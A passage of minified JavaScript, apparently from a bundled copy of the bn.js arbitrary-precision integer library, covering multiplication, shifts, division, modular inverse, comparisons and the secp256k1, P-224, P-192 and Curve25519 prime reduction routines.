                ve = ve + Math.imul(mt, Ye) | 0,
                ve = ve + Math.imul(ct, Ge) | 0,
                ge = ge + Math.imul(ct, Ye) | 0,
                ie = ie + Math.imul(Ke, Fe) | 0,
                ve = ve + Math.imul(Ke, ut) | 0,
                ve = ve + Math.imul(Qe, Fe) | 0,
                ge = ge + Math.imul(Qe, ut) | 0,
                ie = ie + Math.imul(lt, At) | 0,
                ve = ve + Math.imul(lt, St) | 0,
                ve = ve + Math.imul(nt, At) | 0,
                ge = ge + Math.imul(nt, St) | 0,
                ie = ie + Math.imul(Ne, er) | 0,
                ve = ve + Math.imul(Ne, Xt) | 0,
                ve = ve + Math.imul(qe, er) | 0,
                ge = ge + Math.imul(qe, Xt) | 0;
                var nr = ($ + ie | 0) + ((ve & 8191) << 13) | 0;
                $ = (ge + (ve >>> 13) | 0) + (nr >>> 26) | 0,
                nr &= 67108863,
                ie = Math.imul(Ue, xr),
                ve = Math.imul(Ue, Dt),
                ve = ve + Math.imul(rt, xr) | 0,
                ge = Math.imul(rt, Dt),
                ie = ie + Math.imul(He, Mr) | 0,
                ve = ve + Math.imul(He, at) | 0,
                ve = ve + Math.imul(ke, Mr) | 0,
                ge = ge + Math.imul(ke, at) | 0,
                ie = ie + Math.imul(st, Je) | 0,
                ve = ve + Math.imul(st, ht) | 0,
                ve = ve + Math.imul(et, Je) | 0,
                ge = ge + Math.imul(et, ht) | 0,
                ie = ie + Math.imul(we, Ge) | 0,
                ve = ve + Math.imul(we, Ye) | 0,
                ve = ve + Math.imul(_e, Ge) | 0,
                ge = ge + Math.imul(_e, Ye) | 0,
                ie = ie + Math.imul(mt, Fe) | 0,
                ve = ve + Math.imul(mt, ut) | 0,
                ve = ve + Math.imul(ct, Fe) | 0,
                ge = ge + Math.imul(ct, ut) | 0,
                ie = ie + Math.imul(Ke, At) | 0,
                ve = ve + Math.imul(Ke, St) | 0,
                ve = ve + Math.imul(Qe, At) | 0,
                ge = ge + Math.imul(Qe, St) | 0,
                ie = ie + Math.imul(lt, er) | 0,
                ve = ve + Math.imul(lt, Xt) | 0,
                ve = ve + Math.imul(nt, er) | 0,
                ge = ge + Math.imul(nt, Xt) | 0;
                var lr = ($ + ie | 0) + ((ve & 8191) << 13) | 0;
                $ = (ge + (ve >>> 13) | 0) + (lr >>> 26) | 0,
                lr &= 67108863,
                ie = Math.imul(Ue, Mr),
                ve = Math.imul(Ue, at),
                ve = ve + Math.imul(rt, Mr) | 0,
                ge = Math.imul(rt, at),
                ie = ie + Math.imul(He, Je) | 0,
                ve = ve + Math.imul(He, ht) | 0,
                ve = ve + Math.imul(ke, Je) | 0,
                ge = ge + Math.imul(ke, ht) | 0,
                ie = ie + Math.imul(st, Ge) | 0,
                ve = ve + Math.imul(st, Ye) | 0,
                ve = ve + Math.imul(et, Ge) | 0,
                ge = ge + Math.imul(et, Ye) | 0,
                ie = ie + Math.imul(we, Fe) | 0,
                ve = ve + Math.imul(we, ut) | 0,
                ve = ve + Math.imul(_e, Fe) | 0,
                ge = ge + Math.imul(_e, ut) | 0,
                ie = ie + Math.imul(mt, At) | 0,
                ve = ve + Math.imul(mt, St) | 0,
                ve = ve + Math.imul(ct, At) | 0,
                ge = ge + Math.imul(ct, St) | 0,
                ie = ie + Math.imul(Ke, er) | 0,
                ve = ve + Math.imul(Ke, Xt) | 0,
                ve = ve + Math.imul(Qe, er) | 0,
                ge = ge + Math.imul(Qe, Xt) | 0;
                var fr = ($ + ie | 0) + ((ve & 8191) << 13) | 0;
                $ = (ge + (ve >>> 13) | 0) + (fr >>> 26) | 0,
                fr &= 67108863,
                ie = Math.imul(Ue, Je),
                ve = Math.imul(Ue, ht),
                ve = ve + Math.imul(rt, Je) | 0,
                ge = Math.imul(rt, ht),
                ie = ie + Math.imul(He, Ge) | 0,
                ve = ve + Math.imul(He, Ye) | 0,
                ve = ve + Math.imul(ke, Ge) | 0,
                ge = ge + Math.imul(ke, Ye) | 0,
                ie = ie + Math.imul(st, Fe) | 0,
                ve = ve + Math.imul(st, ut) | 0,
                ve = ve + Math.imul(et, Fe) | 0,
                ge = ge + Math.imul(et, ut) | 0,
                ie = ie + Math.imul(we, At) | 0,
                ve = ve + Math.imul(we, St) | 0,
                ve = ve + Math.imul(_e, At) | 0,
                ge = ge + Math.imul(_e, St) | 0,
                ie = ie + Math.imul(mt, er) | 0,
                ve = ve + Math.imul(mt, Xt) | 0,
                ve = ve + Math.imul(ct, er) | 0,
                ge = ge + Math.imul(ct, Xt) | 0;
                var ir = ($ + ie | 0) + ((ve & 8191) << 13) | 0;
                $ = (ge + (ve >>> 13) | 0) + (ir >>> 26) | 0,
                ir &= 67108863,
                ie = Math.imul(Ue, Ge),
                ve = Math.imul(Ue, Ye),
                ve = ve + Math.imul(rt, Ge) | 0,
                ge = Math.imul(rt, Ye),
                ie = ie + Math.imul(He, Fe) | 0,
                ve = ve + Math.imul(He, ut) | 0,
                ve = ve + Math.imul(ke, Fe) | 0,
                ge = ge + Math.imul(ke, ut) | 0,
                ie = ie + Math.imul(st, At) | 0,
                ve = ve + Math.imul(st, St) | 0,
                ve = ve + Math.imul(et, At) | 0,
                ge = ge + Math.imul(et, St) | 0,
                ie = ie + Math.imul(we, er) | 0,
                ve = ve + Math.imul(we, Xt) | 0,
                ve = ve + Math.imul(_e, er) | 0,
                ge = ge + Math.imul(_e, Xt) | 0;
                var $t = ($ + ie | 0) + ((ve & 8191) << 13) | 0;
                $ = (ge + (ve >>> 13) | 0) + ($t >>> 26) | 0,
                $t &= 67108863,
                ie = Math.imul(Ue, Fe),
                ve = Math.imul(Ue, ut),
                ve = ve + Math.imul(rt, Fe) | 0,
                ge = Math.imul(rt, ut),
                ie = ie + Math.imul(He, At) | 0,
                ve = ve + Math.imul(He, St) | 0,
                ve = ve + Math.imul(ke, At) | 0,
                ge = ge + Math.imul(ke, St) | 0,
                ie = ie + Math.imul(st, er) | 0,
                ve = ve + Math.imul(st, Xt) | 0,
                ve = ve + Math.imul(et, er) | 0,
                ge = ge + Math.imul(et, Xt) | 0;
                var Nt = ($ + ie | 0) + ((ve & 8191) << 13) | 0;
                $ = (ge + (ve >>> 13) | 0) + (Nt >>> 26) | 0,
                Nt &= 67108863,
                ie = Math.imul(Ue, At),
                ve = Math.imul(Ue, St),
                ve = ve + Math.imul(rt, At) | 0,
                ge = Math.imul(rt, St),
                ie = ie + Math.imul(He, er) | 0,
                ve = ve + Math.imul(He, Xt) | 0,
                ve = ve + Math.imul(ke, er) | 0,
                ge = ge + Math.imul(ke, Xt) | 0;
                var ar = ($ + ie | 0) + ((ve & 8191) << 13) | 0;
                $ = (ge + (ve >>> 13) | 0) + (ar >>> 26) | 0,
                ar &= 67108863,
                ie = Math.imul(Ue, er),
                ve = Math.imul(Ue, Xt),
                ve = ve + Math.imul(rt, er) | 0,
                ge = Math.imul(rt, Xt);
                var Zt = ($ + ie | 0) + ((ve & 8191) << 13) | 0;
                return $ = (ge + (ve >>> 13) | 0) + (Zt >>> 26) | 0,
                Zt &= 67108863,
                re[0] = pr,
                re[1] = or,
                re[2] = yr,
                re[3] = vr,
                re[4] = gr,
                re[5] = Sr,
                re[6] = br,
                re[7] = _r,
                re[8] = wr,
                re[9] = sr,
                re[10] = dr,
                re[11] = nr,
                re[12] = lr,
                re[13] = fr,
                re[14] = ir,
                re[15] = $t,
                re[16] = Nt,
                re[17] = ar,
                re[18] = Zt,
                $ !== 0 && (re[19] = $,
                te.length++),
                te
            };
            Math.imul || (fe = ue);
            function he(L, U, Z) {
                Z.negative = U.negative ^ L.negative,
                Z.length = L.length + U.length;
                for (var te = 0, se = 0, de = 0; de < Z.length - 1; de++) {
                    var re = se;
                    se = 0;
                    for (var $ = te & 67108863, ie = Math.min(de, U.length - 1), ve = Math.max(0, de - L.length + 1); ve <= ie; ve++) {
                        var ge = de - ve
                          , Re = L.words[ge] | 0
                          , Pe = U.words[ve] | 0
                          , Ie = Re * Pe
                          , Te = Ie & 67108863;
                        re = re + (Ie / 67108864 | 0) | 0,
                        Te = Te + $ | 0,
                        $ = Te & 67108863,
                        re = re + (Te >>> 26) | 0,
                        se += re >>> 26,
                        re &= 67108863
                    }
                    Z.words[de] = $,
                    te = re,
                    re = se
                }
                return te !== 0 ? Z.words[de] = te : Z.length--,
                Z._strip()
            }
            function pe(L, U, Z) {
                return he(L, U, Z)
            }
            w.prototype.mulTo = function(U, Z) {
                var te, se = this.length + U.length;
                return this.length === 10 && U.length === 10 ? te = fe(this, U, Z) : se < 63 ? te = ue(this, U, Z) : se < 1024 ? te = he(this, U, Z) : te = pe(this, U, Z),
                te
            }
            ,
            w.prototype.mul = function(U) {
                var Z = new w(null);
                return Z.words = new Array(this.length + U.length),
                this.mulTo(U, Z)
            }
            ,
            w.prototype.mulf = function(U) {
                var Z = new w(null);
                return Z.words = new Array(this.length + U.length),
                pe(this, U, Z)
            }
            ,
            w.prototype.imul = function(U) {
                return this.clone().mulTo(U, this)
            }
            ,
            w.prototype.imuln = function(U) {
                var Z = U < 0;
                Z && (U = -U),
                O(typeof U == "number"),
                O(U < 67108864);
                for (var te = 0, se = 0; se < this.length; se++) {
                    var de = (this.words[se] | 0) * U
                      , re = (de & 67108863) + (te & 67108863);
                    te >>= 26,
                    te += de / 67108864 | 0,
                    te += re >>> 26,
                    this.words[se] = re & 67108863
                }
                return te !== 0 && (this.words[se] = te,
                this.length++),
                this.length = U === 0 ? 1 : this.length,
                Z ? this.ineg() : this
            }
            ,
            w.prototype.muln = function(U) {
                return this.clone().imuln(U)
            }
            ,
            w.prototype.sqr = function() {
                return this.mul(this)
            }
            ,
            w.prototype.isqr = function() {
                return this.imul(this.clone())
            }
            ,
            w.prototype.pow = function(U) {
                var Z = oe(U);
                if (Z.length === 0)
                    return new w(1);
                for (var te = this, se = 0; se < Z.length && Z[se] === 0; se++,
                te = te.sqr())
                    ;
                if (++se < Z.length)
                    for (var de = te.sqr(); se < Z.length; se++,
                    de = de.sqr())
                        Z[se] !== 0 && (te = te.mul(de));
                return te
            }
            ,
            w.prototype.iushln = function(U) {
                O(typeof U == "number" && U >= 0);
                var Z = U % 26, te = (U - Z) / 26, se = 67108863 >>> 26 - Z << 26 - Z, de;
                if (Z !== 0) {
                    var re = 0;
                    for (de = 0; de < this.length; de++) {
                        var $ = this.words[de] & se
                          , ie = (this.words[de] | 0) - $ << Z;
                        this.words[de] = ie | re,
                        re = $ >>> 26 - Z
                    }
                    re && (this.words[de] = re,
                    this.length++)
                }
                if (te !== 0) {
                    for (de = this.length - 1; de >= 0; de--)
                        this.words[de + te] = this.words[de];
                    for (de = 0; de < te; de++)
                        this.words[de] = 0;
                    this.length += te
                }
                return this._strip()
            }
            ,
            w.prototype.ishln = function(U) {
                return O(this.negative === 0),
                this.iushln(U)
            }
            ,
            w.prototype.iushrn = function(U, Z, te) {
                O(typeof U == "number" && U >= 0);
                var se;
                Z ? se = (Z - Z % 26) / 26 : se = 0;
                var de = U % 26
                  , re = Math.min((U - de) / 26, this.length)
                  , $ = 67108863 ^ 67108863 >>> de << de
                  , ie = te;
                if (se -= re,
                se = Math.max(0, se),
                ie) {
                    for (var ve = 0; ve < re; ve++)
                        ie.words[ve] = this.words[ve];
                    ie.length = re
                }
                if (re !== 0)
                    if (this.length > re)
                        for (this.length -= re,
                        ve = 0; ve < this.length; ve++)
                            this.words[ve] = this.words[ve + re];
                    else
                        this.words[0] = 0,
                        this.length = 1;
                var ge = 0;
                for (ve = this.length - 1; ve >= 0 && (ge !== 0 || ve >= se); ve--) {
                    var Re = this.words[ve] | 0;
                    this.words[ve] = ge << 26 - de | Re >>> de,
                    ge = Re & $
                }
                return ie && ge !== 0 && (ie.words[ie.length++] = ge),
                this.length === 0 && (this.words[0] = 0,
                this.length = 1),
                this._strip()
            }
            ,
            w.prototype.ishrn = function(U, Z, te) {
                return O(this.negative === 0),
                this.iushrn(U, Z, te)
            }
            ,
            w.prototype.shln = function(U) {
                return this.clone().ishln(U)
            }
            ,
            w.prototype.ushln = function(U) {
                return this.clone().iushln(U)
            }
            ,
            w.prototype.shrn = function(U) {
                return this.clone().ishrn(U)
            }
            ,
            w.prototype.ushrn = function(U) {
                return this.clone().iushrn(U)
            }
            ,
            w.prototype.testn = function(U) {
                O(typeof U == "number" && U >= 0);
                var Z = U % 26
                  , te = (U - Z) / 26
                  , se = 1 << Z;
                if (this.length <= te)
                    return !1;
                var de = this.words[te];
                return !!(de & se)
            }
            ,
            w.prototype.imaskn = function(U) {
                O(typeof U == "number" && U >= 0);
                var Z = U % 26
                  , te = (U - Z) / 26;
                if (O(this.negative === 0, "imaskn works only with positive numbers"),
                this.length <= te)
                    return this;
                if (Z !== 0 && te++,
                this.length = Math.min(te, this.length),
                Z !== 0) {
                    var se = 67108863 ^ 67108863 >>> Z << Z;
                    this.words[this.length - 1] &= se
                }
                return this._strip()
            }
            ,
            w.prototype.maskn = function(U) {
                return this.clone().imaskn(U)
            }
            ,
            w.prototype.iaddn = function(U) {
                return O(typeof U == "number"),
                O(U < 67108864),
                U < 0 ? this.isubn(-U) : this.negative !== 0 ? this.length === 1 && (this.words[0] | 0) <= U ? (this.words[0] = U - (this.words[0] | 0),
                this.negative = 0,
                this) : (this.negative = 0,
                this.isubn(U),
                this.negative = 1,
                this) : this._iaddn(U)
            }
            ,
            w.prototype._iaddn = function(U) {
                this.words[0] += U;
                for (var Z = 0; Z < this.length && this.words[Z] >= 67108864; Z++)
                    this.words[Z] -= 67108864,
                    Z === this.length - 1 ? this.words[Z + 1] = 1 : this.words[Z + 1]++;
                return this.length = Math.max(this.length, Z + 1),
                this
            }
            ,
            w.prototype.isubn = function(U) {
                if (O(typeof U == "number"),
                O(U < 67108864),
                U < 0)
                    return this.iaddn(-U);
                if (this.negative !== 0)
                    return this.negative = 0,
                    this.iaddn(U),
                    this.negative = 1,
                    this;
                if (this.words[0] -= U,
                this.length === 1 && this.words[0] < 0)
                    this.words[0] = -this.words[0],
                    this.negative = 1;
                else
                    for (var Z = 0; Z < this.length && this.words[Z] < 0; Z++)
                        this.words[Z] += 67108864,
                        this.words[Z + 1] -= 1;
                return this._strip()
            }
            ,
            w.prototype.addn = function(U) {
                return this.clone().iaddn(U)
            }
            ,
            w.prototype.subn = function(U) {
                return this.clone().isubn(U)
            }
            ,
            w.prototype.iabs = function() {
                return this.negative = 0,
                this
            }
            ,
            w.prototype.abs = function() {
                return this.clone().iabs()
            }
            ,
            w.prototype._ishlnsubmul = function(U, Z, te) {
                var se = U.length + te, de;
                this._expand(se);
                var re, $ = 0;
                for (de = 0; de < U.length; de++) {
                    re = (this.words[de + te] | 0) + $;
                    var ie = (U.words[de] | 0) * Z;
                    re -= ie & 67108863,
                    $ = (re >> 26) - (ie / 67108864 | 0),
                    this.words[de + te] = re & 67108863
                }
                for (; de < this.length - te; de++)
                    re = (this.words[de + te] | 0) + $,
                    $ = re >> 26,
                    this.words[de + te] = re & 67108863;
                if ($ === 0)
                    return this._strip();
                for (O($ === -1),
                $ = 0,
                de = 0; de < this.length; de++)
                    re = -(this.words[de] | 0) + $,
                    $ = re >> 26,
                    this.words[de] = re & 67108863;
                return this.negative = 1,
                this._strip()
            }
            ,
            w.prototype._wordDiv = function(U, Z) {
                var te = this.length - U.length
                  , se = this.clone()
                  , de = U
                  , re = de.words[de.length - 1] | 0
                  , $ = this._countBits(re);
                te = 26 - $,
                te !== 0 && (de = de.ushln(te),
                se.iushln(te),
                re = de.words[de.length - 1] | 0);
                var ie = se.length - de.length, ve;
                if (Z !== "mod") {
                    ve = new w(null),
                    ve.length = ie + 1,
                    ve.words = new Array(ve.length);
                    for (var ge = 0; ge < ve.length; ge++)
                        ve.words[ge] = 0
                }
                var Re = se.clone()._ishlnsubmul(de, 1, ie);
                Re.negative === 0 && (se = Re,
                ve && (ve.words[ie] = 1));
                for (var Pe = ie - 1; Pe >= 0; Pe--) {
                    var Ie = (se.words[de.length + Pe] | 0) * 67108864 + (se.words[de.length + Pe - 1] | 0);
                    for (Ie = Math.min(Ie / re | 0, 67108863),
                    se._ishlnsubmul(de, Ie, Pe); se.negative !== 0; )
                        Ie--,
                        se.negative = 0,
                        se._ishlnsubmul(de, 1, Pe),
                        se.isZero() || (se.negative ^= 1);
                    ve && (ve.words[Pe] = Ie)
                }
                return ve && ve._strip(),
                se._strip(),
                Z !== "div" && te !== 0 && se.iushrn(te),
                {
                    div: ve || null,
                    mod: se
                }
            }
            ,
            w.prototype.divmod = function(U, Z, te) {
                if (O(!U.isZero()),
                this.isZero())
                    return {
                        div: new w(0),
                        mod: new w(0)
                    };
                var se, de, re;
                return this.negative !== 0 && U.negative === 0 ? (re = this.neg().divmod(U, Z),
                Z !== "mod" && (se = re.div.neg()),
                Z !== "div" && (de = re.mod.neg(),
                te && de.negative !== 0 && de.iadd(U)),
                {
                    div: se,
                    mod: de
                }) : this.negative === 0 && U.negative !== 0 ? (re = this.divmod(U.neg(), Z),
                Z !== "mod" && (se = re.div.neg()),
                {
                    div: se,
                    mod: re.mod
                }) : (this.negative & U.negative) !== 0 ? (re = this.neg().divmod(U.neg(), Z),
                Z !== "div" && (de = re.mod.neg(),
                te && de.negative !== 0 && de.isub(U)),
                {
                    div: re.div,
                    mod: de
                }) : U.length > this.length || this.cmp(U) < 0 ? {
                    div: new w(0),
                    mod: this
                } : U.length === 1 ? Z === "div" ? {
                    div: this.divn(U.words[0]),
                    mod: null
                } : Z === "mod" ? {
                    div: null,
                    mod: new w(this.modrn(U.words[0]))
                } : {
                    div: this.divn(U.words[0]),
                    mod: new w(this.modrn(U.words[0]))
                } : this._wordDiv(U, Z)
            }
            ,
            w.prototype.div = function(U) {
                return this.divmod(U, "div", !1).div
            }
            ,
            w.prototype.mod = function(U) {
                return this.divmod(U, "mod", !1).mod
            }
            ,
            w.prototype.umod = function(U) {
                return this.divmod(U, "mod", !0).mod
            }
            ,
            w.prototype.divRound = function(U) {
                var Z = this.divmod(U);
                if (Z.mod.isZero())
                    return Z.div;
                var te = Z.div.negative !== 0 ? Z.mod.isub(U) : Z.mod
                  , se = U.ushrn(1)
                  , de = U.andln(1)
                  , re = te.cmp(se);
                return re < 0 || de === 1 && re === 0 ? Z.div : Z.div.negative !== 0 ? Z.div.isubn(1) : Z.div.iaddn(1)
            }
            ,
            w.prototype.modrn = function(U) {
                var Z = U < 0;
                Z && (U = -U),
                O(U <= 67108863);
                for (var te = (1 << 26) % U, se = 0, de = this.length - 1; de >= 0; de--)
                    se = (te * se + (this.words[de] | 0)) % U;
                return Z ? -se : se
            }
            ,
            w.prototype.modn = function(U) {
                return this.modrn(U)
            }
            ,
            w.prototype.idivn = function(U) {
                var Z = U < 0;
                Z && (U = -U),
                O(U <= 67108863);
                for (var te = 0, se = this.length - 1; se >= 0; se--) {
                    var de = (this.words[se] | 0) + te * 67108864;
                    this.words[se] = de / U | 0,
                    te = de % U
                }
                return this._strip(),
                Z ? this.ineg() : this
            }
            ,
            w.prototype.divn = function(U) {
                return this.clone().idivn(U)
            }
            ,
            w.prototype.egcd = function(U) {
                O(U.negative === 0),
                O(!U.isZero());
                var Z = this
                  , te = U.clone();
                Z.negative !== 0 ? Z = Z.umod(U) : Z = Z.clone();
                for (var se = new w(1), de = new w(0), re = new w(0), $ = new w(1), ie = 0; Z.isEven() && te.isEven(); )
                    Z.iushrn(1),
                    te.iushrn(1),
                    ++ie;
                for (var ve = te.clone(), ge = Z.clone(); !Z.isZero(); ) {
                    for (var Re = 0, Pe = 1; (Z.words[0] & Pe) === 0 && Re < 26; ++Re,
                    Pe <<= 1)
                        ;
                    if (Re > 0)
                        for (Z.iushrn(Re); Re-- > 0; )
                            (se.isOdd() || de.isOdd()) && (se.iadd(ve),
                            de.isub(ge)),
                            se.iushrn(1),
                            de.iushrn(1);
                    for (var Ie = 0, Te = 1; (te.words[0] & Te) === 0 && Ie < 26; ++Ie,
                    Te <<= 1)
                        ;
                    if (Ie > 0)
                        for (te.iushrn(Ie); Ie-- > 0; )
                            (re.isOdd() || $.isOdd()) && (re.iadd(ve),
                            $.isub(ge)),
                            re.iushrn(1),
                            $.iushrn(1);
                    Z.cmp(te) >= 0 ? (Z.isub(te),
                    se.isub(re),
                    de.isub($)) : (te.isub(Z),
                    re.isub(se),
                    $.isub(de))
                }
                return {
                    a: re,
                    b: $,
                    gcd: te.iushln(ie)
                }
            }
            ,
            w.prototype._invmp = function(U) {
                O(U.negative === 0),
                O(!U.isZero());
                var Z = this
                  , te = U.clone();
                Z.negative !== 0 ? Z = Z.umod(U) : Z = Z.clone();
                for (var se = new w(1), de = new w(0), re = te.clone(); Z.cmpn(1) > 0 && te.cmpn(1) > 0; ) {
                    for (var $ = 0, ie = 1; (Z.words[0] & ie) === 0 && $ < 26; ++$,
                    ie <<= 1)
                        ;
                    if ($ > 0)
                        for (Z.iushrn($); $-- > 0; )
                            se.isOdd() && se.iadd(re),
                            se.iushrn(1);
                    for (var ve = 0, ge = 1; (te.words[0] & ge) === 0 && ve < 26; ++ve,
                    ge <<= 1)
                        ;
                    if (ve > 0)
                        for (te.iushrn(ve); ve-- > 0; )
                            de.isOdd() && de.iadd(re),
                            de.iushrn(1);
                    Z.cmp(te) >= 0 ? (Z.isub(te),
                    se.isub(de)) : (te.isub(Z),
                    de.isub(se))
                }
                var Re;
                return Z.cmpn(1) === 0 ? Re = se : Re = de,
                Re.cmpn(0) < 0 && Re.iadd(U),
                Re
            }
            ,
            w.prototype.gcd = function(U) {
                if (this.isZero())
                    return U.abs();
                if (U.isZero())
                    return this.abs();
                var Z = this.clone()
                  , te = U.clone();
                Z.negative = 0,
                te.negative = 0;
                for (var se = 0; Z.isEven() && te.isEven(); se++)
                    Z.iushrn(1),
                    te.iushrn(1);
                do {
                    for (; Z.isEven(); )
                        Z.iushrn(1);
                    for (; te.isEven(); )
                        te.iushrn(1);
                    var de = Z.cmp(te);
                    if (de < 0) {
                        var re = Z;
                        Z = te,
                        te = re
                    } else if (de === 0 || te.cmpn(1) === 0)
                        break;
                    Z.isub(te)
                } while (!0);
                return te.iushln(se)
            }
            ,
            w.prototype.invm = function(U) {
                return this.egcd(U).a.umod(U)
            }
            ,
            w.prototype.isEven = function() {
                return (this.words[0] & 1) === 0
            }
            ,
            w.prototype.isOdd = function() {
                return (this.words[0] & 1) === 1
            }
            ,
            w.prototype.andln = function(U) {
                return this.words[0] & U
            }
            ,
            w.prototype.bincn = function(U) {
                O(typeof U == "number");
                var Z = U % 26
                  , te = (U - Z) / 26
                  , se = 1 << Z;
                if (this.length <= te)
                    return this._expand(te + 1),
                    this.words[te] |= se,
                    this;
                for (var de = se, re = te; de !== 0 && re < this.length; re++) {
                    var $ = this.words[re] | 0;
                    $ += de,
                    de = $ >>> 26,
                    $ &= 67108863,
                    this.words[re] = $
                }
                return de !== 0 && (this.words[re] = de,
                this.length++),
                this
            }
            ,
            w.prototype.isZero = function() {
                return this.length === 1 && this.words[0] === 0
            }
            ,
            w.prototype.cmpn = function(U) {
                var Z = U < 0;
                if (this.negative !== 0 && !Z)
                    return -1;
                if (this.negative === 0 && Z)
                    return 1;
                this._strip();
                var te;
                if (this.length > 1)
                    te = 1;
                else {
                    Z && (U = -U),
                    O(U <= 67108863, "Number is too big");
                    var se = this.words[0] | 0;
                    te = se === U ? 0 : se < U ? -1 : 1
                }
                return this.negative !== 0 ? -te | 0 : te
            }
            ,
            w.prototype.cmp = function(U) {
                if (this.negative !== 0 && U.negative === 0)
                    return -1;
                if (this.negative === 0 && U.negative !== 0)
                    return 1;
                var Z = this.ucmp(U);
                return this.negative !== 0 ? -Z | 0 : Z
            }
            ,
            w.prototype.ucmp = function(U) {
                if (this.length > U.length)
                    return 1;
                if (this.length < U.length)
                    return -1;
                for (var Z = 0, te = this.length - 1; te >= 0; te--) {
                    var se = this.words[te] | 0
                      , de = U.words[te] | 0;
                    if (se !== de) {
                        se < de ? Z = -1 : se > de && (Z = 1);
                        break
                    }
                }
                return Z
            }
            ,
            w.prototype.gtn = function(U) {
                return this.cmpn(U) === 1
            }
            ,
            w.prototype.gt = function(U) {
                return this.cmp(U) === 1
            }
            ,
            w.prototype.gten = function(U) {
                return this.cmpn(U) >= 0
            }
            ,
            w.prototype.gte = function(U) {
                return this.cmp(U) >= 0
            }
            ,
            w.prototype.ltn = function(U) {
                return this.cmpn(U) === -1
            }
            ,
            w.prototype.lt = function(U) {
                return this.cmp(U) === -1
            }
            ,
            w.prototype.lten = function(U) {
                return this.cmpn(U) <= 0
            }
            ,
            w.prototype.lte = function(U) {
                return this.cmp(U) <= 0
            }
            ,
            w.prototype.eqn = function(U) {
                return this.cmpn(U) === 0
            }
            ,
            w.prototype.eq = function(U) {
                return this.cmp(U) === 0
            }
            ,
            w.red = function(U) {
                return new ce(U)
            }
            ,
            w.prototype.toRed = function(U) {
                return O(!this.red, "Already a number in reduction context"),
                O(this.negative === 0, "red works only with positives"),
                U.convertTo(this)._forceRed(U)
            }
            ,
            w.prototype.fromRed = function() {
                return O(this.red, "fromRed works only with numbers in reduction context"),
                this.red.convertFrom(this)
            }
            ,
            w.prototype._forceRed = function(U) {
                return this.red = U,
                this
            }
            ,
            w.prototype.forceRed = function(U) {
                return O(!this.red, "Already a number in reduction context"),
                this._forceRed(U)
            }
            ,
            w.prototype.redAdd = function(U) {
                return O(this.red, "redAdd works only with red numbers"),
                this.red.add(this, U)
            }
            ,
            w.prototype.redIAdd = function(U) {
                return O(this.red, "redIAdd works only with red numbers"),
                this.red.iadd(this, U)
            }
            ,
            w.prototype.redSub = function(U) {
                return O(this.red, "redSub works only with red numbers"),
                this.red.sub(this, U)
            }
            ,
            w.prototype.redISub = function(U) {
                return O(this.red, "redISub works only with red numbers"),
                this.red.isub(this, U)
            }
            ,
            w.prototype.redShl = function(U) {
                return O(this.red, "redShl works only with red numbers"),
                this.red.shl(this, U)
            }
            ,
            w.prototype.redMul = function(U) {
                return O(this.red, "redMul works only with red numbers"),
                this.red._verify2(this, U),
                this.red.mul(this, U)
            }
            ,
            w.prototype.redIMul = function(U) {
                return O(this.red, "redMul works only with red numbers"),
                this.red._verify2(this, U),
                this.red.imul(this, U)
            }
            ,
            w.prototype.redSqr = function() {
                return O(this.red, "redSqr works only with red numbers"),
                this.red._verify1(this),
                this.red.sqr(this)
            }
            ,
            w.prototype.redISqr = function() {
                return O(this.red, "redISqr works only with red numbers"),
                this.red._verify1(this),
                this.red.isqr(this)
            }
            ,
            w.prototype.redSqrt = function() {
                return O(this.red, "redSqrt works only with red numbers"),
                this.red._verify1(this),
                this.red.sqrt(this)
            }
            ,
            w.prototype.redInvm = function() {
                return O(this.red, "redInvm works only with red numbers"),
                this.red._verify1(this),
                this.red.invm(this)
            }
            ,
            w.prototype.redNeg = function() {
                return O(this.red, "redNeg works only with red numbers"),
                this.red._verify1(this),
                this.red.neg(this)
            }
            ,
            w.prototype.redPow = function(U) {
                return O(this.red && !U.red, "redPow(normalNum)"),
                this.red._verify1(this),
                this.red.pow(this, U)
            }
            ;
            var ye = {
                k256: null,
                p224: null,
                p192: null,
                p25519: null
            };
            function be(L, U) {
                this.name = L,
                this.p = new w(U,16),
                this.n = this.p.bitLength(),
                this.k = new w(1).iushln(this.n).isub(this.p),
                this.tmp = this._tmp()
            }
            be.prototype._tmp = function() {
                var U = new w(null);
                return U.words = new Array(Math.ceil(this.n / 13)),
                U
            }
            ,
            be.prototype.ireduce = function(U) {
                var Z = U, te;
                do
                    this.split(Z, this.tmp),
                    Z = this.imulK(Z),
                    Z = Z.iadd(this.tmp),
                    te = Z.bitLength();
                while (te > this.n);
                var se = te < this.n ? -1 : Z.ucmp(this.p);
                return se === 0 ? (Z.words[0] = 0,
                Z.length = 1) : se > 0 ? Z.isub(this.p) : Z.strip !== void 0 ? Z.strip() : Z._strip(),
                Z
            }
            ,
            be.prototype.split = function(U, Z) {
                U.iushrn(this.n, 0, Z)
            }
            ,
            be.prototype.imulK = function(U) {
                return U.imul(this.k)
            }
            ;
            function xe() {
                be.call(this, "k256", "ffffffff ffffffff ffffffff ffffffff ffffffff ffffffff fffffffe fffffc2f")
            }
            x(xe, be),
            xe.prototype.split = function(U, Z) {
                for (var te = 4194303, se = Math.min(U.length, 9), de = 0; de < se; de++)
                    Z.words[de] = U.words[de];
                if (Z.length = se,
                U.length <= 9) {
                    U.words[0] = 0,
                    U.length = 1;
                    return
                }
                var re = U.words[9];
                for (Z.words[Z.length++] = re & te,
                de = 10; de < U.length; de++) {
                    var $ = U.words[de] | 0;
                    U.words[de - 10] = ($ & te) << 4 | re >>> 22,
                    re = $
                }
                re >>>= 22,
                U.words[de - 10] = re,
                re === 0 && U.length > 10 ? U.length -= 10 : U.length -= 9
            }
            ,
            xe.prototype.imulK = function(U) {
                U.words[U.length] = 0,
                U.words[U.length + 1] = 0,
                U.length += 2;
                for (var Z = 0, te = 0; te < U.length; te++) {
                    var se = U.words[te] | 0;
                    Z += se * 977,
                    U.words[te] = Z & 67108863,
                    Z = se * 64 + (Z / 67108864 | 0)
                }
                return U.words[U.length - 1] === 0 && (U.length--,
                U.words[U.length - 1] === 0 && U.length--),
                U
            }
            ;
            function Ae() {
                be.call(this, "p224", "ffffffff ffffffff ffffffff ffffffff 00000000 00000000 00000001")
            }
            x(Ae, be);
            function Ee() {
                be.call(this, "p192", "ffffffff ffffffff ffffffff fffffffe ffffffff ffffffff")
            }
            x(Ee, be);
            function Be() {
                be.call(this, "25519", "7fffffffffffffff ffffffffffffffff ffffffffffffffff ffffffffffffffed")
            }
            x(Be, be),
            Be.prototype.imulK = function(U) {
                for (var Z = 0, te = 0; te < U.length; te++) {
                    var se = (U.words[te] | 0) * 19 + Z
                      , de = se & 67108863;
                    se >>>= 26,
                    U.words[te] = de,
